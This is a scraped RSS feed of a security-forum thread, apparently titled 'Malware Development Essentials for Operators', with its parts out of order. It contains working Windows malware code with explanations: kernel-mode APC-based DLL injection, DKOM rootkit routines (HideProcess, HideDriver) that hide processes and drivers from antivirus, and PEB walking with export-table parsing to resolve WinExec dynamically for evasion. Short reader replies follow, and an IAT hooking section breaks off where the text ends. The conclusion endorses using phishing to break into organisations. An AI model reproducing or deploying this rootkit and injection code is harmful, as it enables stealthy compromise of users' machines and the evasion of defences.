        if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &amp;pvMemory, 0, &amp;Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        {
            // Create an APC (Asynchronous Procedure Call) to load the DLL
            KAPC_STATE KasState;
            PKAPC Apc;

            // Attach to the target process
            KeStackAttachProcess(Peprocess, &amp;KasState);

            // Copy the DLL path to the target process&#39;s memory
            strcpy(pvMemory, DllFormatPath);

            // Detach from the target process
            KeUnstackDetachProcess(&amp;KasState);

            // Allocate memory for the APC
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                // Initialize the APC with the appropriate routine and parameters
                KeInitializeApc(Apc, Pethread, 0, (PKKERNEL_ROUTINE)APCKernelRoutine, 0, (PKNORMAL_ROUTINE)Hash.pvLoadLibraryExA, UserMode, pvMemory);

                // Insert the APC into the thread&#39;s queue
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
                return STATUS_SUCCESS;
            }
        }
        // Close the target process handle
        ZwClose(hProcess);
    }

    return STATUS_NO_MEMORY;
}

```

The `DllInject` function serves the critical role of injecting a DLL into a target process in kernel mode. It accepts several parameters, including the `ProcessId` of the target process, the `PEPROCESS` structure of the target process (`Peprocess`), the `PETHREAD` structure of the target process (`Pethread`), and a Boolean value indicating whether alertable I/O is allowed (`Alert`).

The injection process begins with the opening of the target process using `ZwOpenProcess`. This step grants us access to the target process with full privileges.

Subsequently, we allocate virtual memory within the target process using `ZwAllocateVirtualMemory`. This allocated memory will be used to store the path to the DLL that we intend to inject.

To safely write data into the target process&#39;s memory, we attach to the target process using `KeStackAttachProcess`. This attachment is crucial for the integrity and safety of the DLL injection process.

With the attachment in place, we copy the path of the DLL to be injected into the allocated virtual memory within the target process. This path is defined in the `DllFormatPath` variable.

After successfully copying the DLL path, we detach from the target process using `KeUnstackDetachProcess`.

The heart of the DLL injection lies in the creation of an Asynchronous Procedure Call (APC). This is accomplished by allocating memory for the APC using `ExAllocatePool`. The APC is initialized with the necessary routine and parameters.

- The `Apc` structure is initialized using `KeInitializeApc`.
- The parameters include the target thread (`Pethread`) and an APC routine (`APCKernelRoutine`) responsible for loading the DLL.
- Additionally, the normal routine is specified as `Hash.pvLoadLibraryExA` to load the DLL using `LoadLibraryExA` from `kernel32.dll`.
- The APC is inserted into the thread&#39;s queue with `KeInsertQueueApc`.

To ensure that DLL injection occurs in a controlled and synchronized manner, we rely on the `SirifefWorkerRoutine` and `APCInjectorRoutine` functions.

```c
VOID SirifefWorkerRoutine(PVOID Context)
{
    DllInject(((PSIRIFEF_INJECTION_DATA)Context)-&gt;ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Process, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Ethread, FALSE);
    KeSetEvent(&amp;((PSIRIFEF_INJECTION_DATA)Context)-&gt;Event, (KPRIORITY)0, FALSE);
    return;
}
```

The `SirifefWorkerRoutine` function acts as a worker routine responsible for triggering the DLL injection. It accepts a single `Context` parameter.

Within this function, the actual DLL injection is initiated by calling the `DllInject` function. The parameters provided include the target process&#39;s ID, the process&#39;s `EPROCESS` structure, and the process&#39;s `ETHREAD` structure. The final parameter, `FALSE`, indicates that alertable I/O is not allowed.

Once the DLL injection process completes, an event (`KeSetEvent`) is set to signal the successful injection. This event allows us to synchronize the completion of the injection process with other parts of the code.

###  DLL Injection via APC
The initiation of DLL injection takes place within the `APCInjectorRoutine` function, The `APCInjectorRoutine` function serves as the orchestrator for our DLL injection process. It commences by initializing a `SIRIFEF_INJECTION_DATA` structure, `Sf`, and scheduling a worker thread (`SirifefWorkerRoutine`) to perform the injection.

```c
VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID *SystemArgument1, PVOID *SystemArgument2, PVOID* Context)
{
    SIRIFEF_INJECTION_DATA Sf;

    RtlSecureZeroMemory(&amp;Sf, sizeof(SIRIFEF_INJECTION_DATA));
    ExFreePool(Apc);

    // Initialize the SIRIFEF_INJECTION_DATA structure with the necessary information
    Sf.Ethread = KeGetCurrentThread();
    Sf.Process = IoGetCurrentProcess();
    Sf.ProcessId = PsGetCurrentProcessId();

    // Initialize an event to synchronize the DLL injection
    KeInitializeEvent(&amp;Sf.Event, NotificationEvent, FALSE);

    // Initialize a work item to execute the SirifefWorkerRoutine
    ExInitializeWorkItem(&amp;Sf.WorkItem, (PWORKER_THREAD_ROUTINE)SirifefWorkerRoutine, &amp;Sf);

    // Queue the work item to be executed on the DelayedWorkQueue
    ExQueueWorkItem(&amp;Sf.WorkItem, DelayedWorkQueue);

    // Wait for the DLL injection to complete
    KeWaitForSingleObject(&amp;Sf.Event, Executive, KernelMode, TRUE, 0);

    return;
}

```
 
These routines work together to schedule and execute the DLL injection into the target process after the `kernel32.dll` module is loaded. This injection is performed in a controlled and synchronized manner, ensuring that the target process is injected with the specified. 
### Hide Process 
A interesting technique we can use in our rootkit is to hide or unlink a target process, which will be hidden from AVs,  We won’t be able to see this in the Windows Task Manager. 

To hide our process we need to understand a few Windows internal concepts, such as the `EPROCESS` data structure in the Windows kernel. `EPROCESS` is an opaque data structure in the Windows kernel that contains important information about processes running on the system. The offsets of this large structure change from build to build or version to version.

What we’re interested in is, `ActiveProcessLinks`, which is a pointer to a structure called `LIST_ENTRY`. We can’t just access this data structure normally like `EPROCESS.ActiveProcessLinks`, we have to use [PsGetCurrentProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psgetcurrentprocessid) to get the current `EPROCESS` and then add an offset that is version dependent. This is the downside to the `EPROCESS` structure. It can make it very hard to have a compatible Windows Kernel rootkit.

```
kd&gt; dt nt!_EPROCESS
&lt;..redacted...&gt;
    +0x000 Pcb              : _KPROCESS
    +0x3e8 ProcessLock      : _EX_PUSH_LOCK
    +0x2f0 UniqueProcessId  : Ptr64 Void
    +0x400 ActiveProcessLinks : _LIST_ENTRY
```

The `LIST_ENTRY` data structure is a doubly-linked list, where `FLINK` (forward link) and `BLINK` are references to the next and previous elements in the doubly-linked list.

![img](upload://tdXjZgZaIqarhbexg3YcR2oWNM2.png)

Using the information above, we can hide our process from being shown by manipulating the kernel data structures. To hide our process we can do the following:

- Point the `ActiveProcessLinks.FLINK` of `EPROCESS 1` to `ActiveProcessLinks.FLINK` of `EPROCESS 3` .
- Point `ActiveProcessLinks.BLINK` of `EPROCESS 3` to `ActiveProcessLinks.BLINK` OF `EPROCESS 1`.

This manipulation unlinks the data structure of our target process, `EPROCESS 2`, from the doubly-linked list, rendering it invisible to system inspectors.

```c
// Function to hide a process by manipulating kernel data structures
NTSTATUS HideProcess(ULONG pid) {
    PEPROCESS currentEProcess = PsGetCurrentProcess();
    LIST_ENTRY* currentList = &amp;currentEProcess-&gt;ActiveProcessLinks;
    
    // Get the offsets for UniqueProcessId and ActiveProcessLinks
    ULONG uniqueProcessIdOffset = FIELD_OFFSET(EPROCESS, UniqueProcessId);
    ULONG activeProcessLinksOffset = FIELD_OFFSET(EPROCESS, ActiveProcessLinks);
    
    ULONG currentPid;
    
    do {
        // Check if the current process ID is the one to hide
        RtlCopyMemory(&amp;currentPid, (PUCHAR)currentEProcess + uniqueProcessIdOffset, sizeof(currentPid));
        if (currentPid == pid) {
            // Remove the process from the list
            LIST_ENTRY* blink = currentList-&gt;Blink;
            LIST_ENTRY* flink = currentList-&gt;Flink;
            blink-&gt;Flink = flink;
            flink-&gt;Blink = blink;
            return STATUS_SUCCESS;
        }
        
        // Move to the next process
        currentList = currentList-&gt;Flink;
        currentEProcess = CONTAINING_RECORD(currentList, EPROCESS, ActiveProcessLinks);
    } while (currentList != &amp;currentEProcess-&gt;ActiveProcessLinks);
    
    return STATUS_NOT_FOUND;  // Process not found
}
```

`HideProcess`, which hides a process using the DKOM technique. It takes the Process ID (PID) of the target process as an argument. Here&#39;s how it works:

1. It starts by obtaining the current `EPROCESS` structure for the executing driver using `PsGetCurrentProcess`.
2. The code then retrieves the offsets within the `EPROCESS` structure for `UniqueProcessId` and `ActiveProcessLinks`.
3. It iterates through the list of active processes, comparing the PID of each process with the target PID. When it finds a match, it unlinks the process from the `ActiveProcessLinks` list, effectively hiding it.
4. The function returns `STATUS_SUCCESS` if it successfully hides the process. If the target process is not found, it returns `STATUS_NOT_FOUND`.
### Hiding a Driver
In addition to hiding processes, we can also employ the DKOM technique to hide drivers from the system. This is particularly useful in scenarios where a rootkit needs to remain undetected

```c
// Function to hide a driver by manipulating data structures
NTSTATUS HideDriver(PDRIVER_OBJECT driverObject) {
    KIRQL irql;
    
    // Raise IRQL to DPC level
    irql = KeRaiseIrqlToDpcLevel();
    
    // Get the module entry from the DriverObject
    PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)driverObject-&gt;DriverSection;
    
    // Unlink the module entry
    moduleEntry-&gt;InLoadOrderLinks.Blink-&gt;Flink = moduleEntry-&gt;InLoadOrderLinks.Flink;
    moduleEntry-&gt;InLoadOrderLinks.Flink-&gt;Blink = moduleEntry-&gt;InLoadOrderLinks.Blink;
    
    // Lower IRQL back to its original value
    KeLowerIrql(irql);
    
    return STATUS_SUCCESS;
}

```

`HideDriver` function is designed to hide a driver by manipulating kernel data structures. Here&#39;s a breakdown of how it works:

1. It raises the IRQL (Interrupt Request Level) to DPC (Deferred Procedure Call) level using `KeRaiseIrqlToDpcLevel`. This is essential to ensure that the manipulation of kernel data structures is performed atomically and doesn&#39;t interfere with ongoing system operations.
2. Next, it obtains the module entry by casting the `DriverSection` member of the provided `driverObject` to a `PLDR_DATA_TABLE_ENTRY`. This provides access to information about the driver module.
3. It unlinks the module entry from the kernel&#39;s internal linked lists. By manipulating the `InLoadOrderLinks` member of the module entry, it effectively removes the driver from the list of loaded modules.
4. Finally, it lowers the IRQL back to its original value using `KeLowerIrql`, allowing normal system operation to resume.
# Conclusion 

Thank you for reading, and I hope you&#39;ve learned something from this. We&#39;ve covered a lot of topics. I removed the shellcode development section to keep things simpler, which I may cover in a separate article. I&#39;ve included great resources that helped create this article. Remember,  

&quot; Social engineering and phishing, combined with some operative knowledge about windows hacking, should be enough to get you inside the networks of most organization&quot;

##  References and Credits

[ Anatomy of the Process Environment Block (PEB) (Windows Internals](https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/)

[Manipulating Active processlinks](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland) 

[ DLL Injection](https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection)

[Kernel Mode Rootkits](https://memn0ps.github.io/kernel-mode-rootkits/)

[Enumerating RWX Protected Memory Regions for Code Injection](https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions)

[Windows APT Warfare](https://www.drmaster.com.tw/Bookinfo.asp?BookID=MP22111)</description>
    
    <lastBuildDate>Thu, 07 Mar 2024 03:20:05 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/10</link>
        <pubDate>Fri, 08 Mar 2024 18:33:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-10</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[initfs]]></dc:creator>
        <description><![CDATA[
            <p>This is so dense, so obviously this left me with some questions:</p>
<ol>
<li>How the rootkit its installed, I mean, in linux you have lkm system but on windows what?</li>
<li>The rootkit for windows 7 could be run in windows 10? if not how modify the code to make it compatible? in linux you can explore the code, so you have a very clear picture of what happened in what version but the windows kernel is more obscure</li>
<li>I read from an article about writing rootkits the next thing:</li>
</ol>
<blockquote>
<p>All you need is do is learn assembly and C/C++ programming, plus exploit development, reverse engineering, and Windows internals, and then find and abuse a buggy driver, and inject and install your rootkit, and bam.</p>
</blockquote>
<p><a href="https://www.theregister.com/2020/08/07/def_con_demirkapi/" rel="noopener nofollow ugc">article</a></p>
<p>is this true?</p>
<p>Your content is so advance, I like it so much, but I still feel it like is more about the “what” and not the “why”, so at the end I just know how to do the things but I do not comprehend it.</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/9</link>
        <pubDate>Thu, 07 Mar 2024 03:16:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-9</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[EG1116]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for your thread.</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/8</link>
        <pubDate>Sat, 18 Nov 2023 16:01:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-8</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[Secey]]></dc:creator>
        <description><![CDATA[
            <p>This article is impressive,thanks.</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/7</link>
        <pubDate>Thu, 16 Nov 2023 08:16:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-7</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[ATreeShine]]></dc:creator>
        <description><![CDATA[
            <p>That’s amazing, thanks.</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/6</link>
        <pubDate>Mon, 13 Nov 2023 14:05:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-6</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <p>you can do ctrl + P and save the file as a pdf</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/5</link>
        <pubDate>Thu, 09 Nov 2023 09:05:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-5</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[cicada]]></dc:creator>
        <description><![CDATA[
            <p>Now THIS is excellent content</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/4</link>
        <pubDate>Wed, 08 Nov 2023 19:03:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-4</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[messede]]></dc:creator>
        <description><![CDATA[
            <p>another excellent piece.</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/3</link>
        <pubDate>Wed, 08 Nov 2023 16:12:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-3</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[c0mrade]]></dc:creator>
        <description><![CDATA[
            <p>I could download this as a pdf or something</p>
          <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769/2</link>
        <pubDate>Wed, 08 Nov 2023 09:26:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37769-2</guid>
        <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
      </item>
      <item>
        <title>Malware Development Essentials for Operators</title>
        <dc:creator><![CDATA[0xf00I]]></dc:creator>
        <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>This article will delve into fundamental and techniques related to malware development for Windows OS, We’ll start by exploring the WinAPI, understanding how code manipulation works in the context of malware development. We’ll cover things like loading functions dynamically, accessing the Process Environment Block (PEB), and executing functions in code, Next  we’ll look into obfuscation and payload encoding. We’ll use techniques like XOR and AES encryption to make our malicious code harder to detect. We’ll also explore ways to insert our malicious code, like using classic shellcode and DLL injections To wrap things up, we’ll create a simple rootkit, concluding our journey through the world of malware development, As usual, we will delve into the code and techniques, providing a detailed, step-by-step breakdown.</p>
<h1><a name="dynamic-function-loading-and-execution-2" class="anchor" href="https://0x00sec.org#dynamic-function-loading-and-execution-2"></a>Dynamic Function Loading and Execution</h1>
<p>Time to dive into some naked code action! We’re gonna break down this code and make it crystal clear, so you can get what’s going on.</p>
<pre><code class="lang-c">int main(void) {
MessageBoxA(0, "Foo Here.", "info", 0);
return 0;
}
</code></pre>
<p>This is a simple program. It uses the <code>MessageBoxA</code> function, which is part of the Windows API. This function displays a modal dialog box with specified text and a caption. In this code, we’re making a straightforward call to the <code>MessageBoxA</code> function to show a message box.</p>
<p>The <code>MessageBoxA</code> function is statically linked to your program during the compilation process. This means that the function’s code is included in your program, so you don’t need to load it at runtime.</p>
<p>Now, let’s contrast this with the following code:</p>
<pre><code class="lang-c">int main(void) {
size_t get_MessageBoxA = (size_t)GetProcAddress( LoadLibraryA("USER32.dll"), "MessageBoxA" );
def_MessageBoxA msgbox_a = (def_MessageBoxA) get_MessageBoxA;
msgbox_a(0, "Foo Here.", "info", 0);
return 0;
}
</code></pre>
<p>In this code, we take a different approach. We dynamically load and call the <code>MessageBoxA</code> function using the <code>GetProcAddress</code> function. This function retrieves the address of the <code>MessageBoxA</code> function from the USER32.dll library at runtime.</p>
<p>To work with this dynamically loaded function, we define a function pointer type <code>def_MessageBoxA</code> that matches the signature of the <code>MessageBoxA</code> function. We then cast the obtained function address to this function pointer and use it to call the function.</p>
<p>So, how is this related to malware? Well, by dynamically loading functions, we can avoid having to statically link to libraries that are associated with shady activity, meaning that hooking a function dynamically with the use of pointers can make it more challenging for static analysis tools to identify the behavior of the code. Let’s Take an example:</p>
<pre><code class="lang-c">__declspec(dllexport) void func01() { MessageBoxA(0, "", "Function 1", 0); }
__declspec(dllexport) void func02() { MessageBoxA(0, "", "Function 2", 0); }

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Hook function func01
    }
    return TRUE;
}
</code></pre>
<p>In this example, we have a DLL with two exported functions, <code>func01</code> and <code>func02</code>. Initially, both functions display message boxes. However, in the <code>DllMain</code> function, which is automatically executed when the DLL is loaded may start with benign functionality but could use dynamic function loading and function hooking to change the behavior of <code>func01</code> at runtime. So, let’s continue on this code manipulation journey, exploring the intricacies of dynamic function loading, PEB access, and function execution, which are essential concepts in understanding how code can be adapted and manipulated.</p>
<p>Before, continuing I would like to highlight in which step PEB is created on process creation When <em>Starting a program</em> (calc.exe for example): calc.exe will call a win32 API function : <strong>CreateProcess</strong> which sends to the OS the request to create this process and start the execution.</p>
<p>Creating the process data structures: Windows creates the process structure <strong>EPROCESS</strong> on kernel land for the newly created calc.exe process, Initialize the virtual memory: Then, Windows creates the process, virtual memory, and its representation of the physical memory and saves it inside the <strong>EPROCESS</strong> structure, <code>creates the PEB structure with all necessary information, and then loads the main two DLLs that Windows applications will always need, which are ntdll.dll and kernel32.dll</code> and finally loading the PE file and start the execution.</p>
<ul>
<li><strong>PEB</strong> can be accessed from <strong>User Mode</strong> - Contains Process specific information</li>
<li><strong>EPROCESS</strong> can be only be accessed from <strong>Kernel Mode</strong></li>
</ul>
<h3><a name="peb-structure-3" class="anchor" href="https://0x00sec.org#peb-structure-3"></a>PEB Structure</h3>
<p>PEB is a data structure in the Windows operating system that contains information and settings related to a running process, The process control block contains data that is only useful to the kernel, such as the preferred CPU for this process. The Thread Control Block is entirely different, and is what the kernel uses to manage threads, which are what the kernel runs at the lowest level.</p>
<p>the PEB is accessed to retrieve information about loaded modules, specifically the base addresses of dynamically linked libraries (DLLs). Let’s explore how the PEB is used in the code:</p>
<pre><code class="lang-c">typedef struct _PEB_LDR_DATA {
ULONG Length;
UCHAR Initialized;
PVOID SsHandle;
LIST_ENTRY InLoadOrderModuleList;
LIST_ENTRY InMemoryOrderModuleList;
LIST_ENTRY InInitializationOrderModuleList;
PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA; 

typedef struct _UNICODE_STRING32 {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING32, *PUNICODE_STRING32;

typedef struct _PEB32 {
    // ...
} PEB32, *PPEB32;

typedef struct _PEB_LDR_DATA32 {
    // ...
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

typedef struct _LDR_DATA_TABLE_ENTRY32 {
    // ...
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;
</code></pre>
<p>As you can see, the PEB is a robust structure. The code defines several structures, such as <code>PEB32</code>, <code>PEB_LDR_DATA32</code>, and <code>LDR_DATA_TABLE_ENTRY32</code>, which are simplified versions of the actual PEB data structures. These structures contain fields that hold information about loaded modules and their locations in memory.</p>
<pre><code class="lang-c">size_t GetModHandle(wchar_t *libName) {
PEB32 *pPEB = (PEB32 *)__readfsdword(0x30); // ds: fs[0x30]
PLIST_ENTRY header = &amp;(pPEB-&gt;Ldr-&gt;InMemoryOrderModuleList);

for (PLIST_ENTRY curr = header-&gt;Flink; curr != header; curr = curr-&gt;Flink) {
LDR_DATA_TABLE_ENTRY32 *data = CONTAINING_RECORD(
curr, LDR_DATA_TABLE_ENTRY32, InMemoryOrderLinks

);
printf("current node: %ls\n", data-&gt;BaseDllName.Buffer);
if (StrStrIW(libName, data-&gt;BaseDllName.Buffer))
return data-&gt;DllBase;
}
return 0;
}
</code></pre>
<p>The <code>GetModHandle</code> function accesses the PEB to find the base address of a loaded module. The PEB contains a data structure called <code>PEB_LDR_DATA</code> that manages information about loaded modules. The <code>InMemoryOrderModuleList</code> field of this structure is a linked list of loaded modules. The <code>GetModHandle</code> function iterates through this list and compares module names to find the desired module based on the <code>libName</code> parameter.</p>
<p>The PEB can be found at fs:[0x30] in the Thread Environment Block for x86 processes as well as at GS:[0x60] for x64 processes.</p>
<p>Next we call the <code>GetFuncAddr</code>function which well be used to locate the address of a specific function within a loaded module. It takes the <code>moduleBase</code> parameter, which is the base address of the module, and it looks into the export table of the module to find the address of the function with the specified name (<code>szFuncName</code>). The export table is part of the module’s data structure, which is managed by the PEB.</p>
<pre><code class="lang-auto">size_t GetFuncAddr(size_t moduleBase, char* szFuncName) {

// parse export table
PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(moduleBase);
PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(moduleBase + dosHdr-&gt;e_lfanew);
IMAGE_OPTIONAL_HEADER optHdr = ntHdr-&gt;OptionalHeader;
IMAGE_DATA_DIRECTORY dataDir_exportDir = optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

// parse exported function info

PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + dataDir_exportDir.VirtualAddress);
DWORD* arrFuncs = (DWORD *)(moduleBase + exportTable-&gt;AddressOfFunctions);
DWORD* arrNames = (DWORD *)(moduleBase + exportTable-&gt;AddressOfNames);
WORD* arrNameOrds = (WORD *)(moduleBase + exportTable-&gt;AddressOfNameOrdinals);
</code></pre>
<p>The function begins by parsing the export table of the loaded module to access information about its exported functions. The export table is part of the Portable Executable (PE) file format and contains details about functions that can be accessed externally.</p>
<ol>
<li>accesses the DOS header and the NT header to navigate to the Optional Header of the PE file.</li>
<li>identifies the data directory for exports using the <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> index from the Optional Header’s data directory array.</li>
<li>calculates the address of the export table, which holds data related to the module’s exported functions.</li>
</ol>
<p>Next, inside the loop, it compares the current exported function’s name (<code>sz_CurrApiName</code>) with the target function name (<code>szFuncName</code>) using a case-insensitive comparison. When a match is found, the function prints information about the matching function, including its name and ordinal.</p>
<pre><code class="lang-c">// lookup
for (size_t i = 0; i &lt; exportTable-&gt;NumberOfNames; i++) {
char* sz_CurrApiName = (char *)(moduleBase + arrNames[i]);
WORD num_CurrApiOrdinal = arrNameOrds[i] + 1;
if (!stricmp(sz_CurrApiName, szFuncName)) {
printf("[+] Found ordinal %.4x - %s\n", num_CurrApiOrdinal, sz_CurrApiName); //enumeration process 
return moduleBase + arrFuncs[ num_CurrApiOrdinal - 1 ];
}
}
return 0;
}
</code></pre>
<p>If the target function name matches the current function name, the function returns the address of that function. It calculates the function’s address by referencing the <code>arrFuncs</code> array and the ordinal. The ordinal, when converted to an index, helps retrieve the correct address from the array.</p>
<p>Why is This Important this technique is usually how code injection is preformed and yes dynamic function loading, now Let’s take a look at main function.</p>
<pre><code class="lang-c">int main(int argc, char** argv, char* envp) {
    size_t kernelBase = GetModHandle(L"kernel32.dll");
    printf("[+] GetModHandle(kernel32.dll) = %p\n", kernelBase); // result of the `GetModHandle` 
    
    size_t ptr_WinExec = (size_t)GetFuncAddr(kernelBase, "WinExec");
    printf("[+] GetFuncAddr(kernel32.dll, WinExec) = %p\n", ptr_WinExec); // the address of the `WinExec`
    ((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)("calc", SW_SHOW); 
    return 0;
}
</code></pre>
<p>We calls the <code>GetModHandle</code> function to find the base address of the “kernel32.dll” module in the current process. It uses the PEB to traverse the list of loaded modules and search for the one with the specified name (“kernel32.dll”), Next we calls the <code>GetFuncAddr</code>  to locate the address of the <code>WinExec</code>, passes the base address of “kernel32.dll” obtained in the previous step and the function name “WinExec” as arguments and Finally, the code dynamically invokes the <code>WinExec</code> function using the address obtained earlier. It casts the <code>ptr_WinExec</code> to the appropriate function pointer type and calls it with the arguments “calc” (to run the Windows Calculator) and <code>SW_SHOW</code></p>
<p>Demonstrates how to dynamically locate and execute the <code>WinExec</code> function from the “kernel32.dll” module, effectively opening the Calculator This shows how code manipulation can be achieved by accessing the PEB and locating and using specific functions from loaded modules.</p>
<p>Alright let’s back up a little bit here “Code Injection” Here’s the section to explain and explore further in the context of code injection:</p>
<pre><code class="lang-c">((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)("calc", SW_SHOW);
</code></pre>
<p>This line dynamically invokes the <code>WinExec</code> function to open the Windows Calculator. Now, let’s break down what’s happening here:</p>
<ul>
<li>
<p><code>(UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec</code> involves typecasting the <code>ptr_WinExec</code> pointer into a function pointer with the appropriate signature. This typecasting is crucial to match the required parameters of the <code>WinExec</code> function, which includes a string (LPCSTR) and an integer (UINT).</p>
</li>
<li>
<p><code>("calc", SW_SHOW)</code> represents the arguments passed to the <code>WinExec</code> function. In this instance, it instructs the system to open the Windows Calculator (“calc”) with a specified display mode (<code>SW_SHOW</code>).</p>
</li>
</ul>
<p>In essence, what’s occurring here is:</p>
<p>The code dynamically injects the execution of the <code>WinExec</code> function into the context of a legitimate process. Rather than statically linking to the <code>WinExec</code> function, this code locates and invokes it dynamically. Dynamic function loading is a technique often employed in malware to access specific functions without the need for direct imports, making it more evasive.</p>
<p>It’s important to note that in this code example, opening the Windows Calculator is a benign action. However, it serves as an illustrative case of code injection and dynamic function invocation.</p>
<h1><a name="dynamic-function-loading-iat-hooking-4" class="anchor" href="https://0x00sec.org#dynamic-function-loading-iat-hooking-4"></a>Dynamic Function Loading (IAT Hooking)</h1>
<p>Dynamic Function Loading is a technique used in the realm of Windows programming and sometimes in malware development to load and execute functions at runtime. One way to achieve this is through “Import Address Table (IAT) Hooking.” The IAT contains the addresses of functions that a module (such as a DLL or executable) imports from other modules. IAT hooking allows us to intercept and modify function calls by manipulating the IAT.</p>
<p>IAT table looks something like:</p>
<pre><code class="lang-auto">                Application                                               mydll
           +-------------------+                                  +--------------------+
           |                   |                                  |       MessageBoxA  |
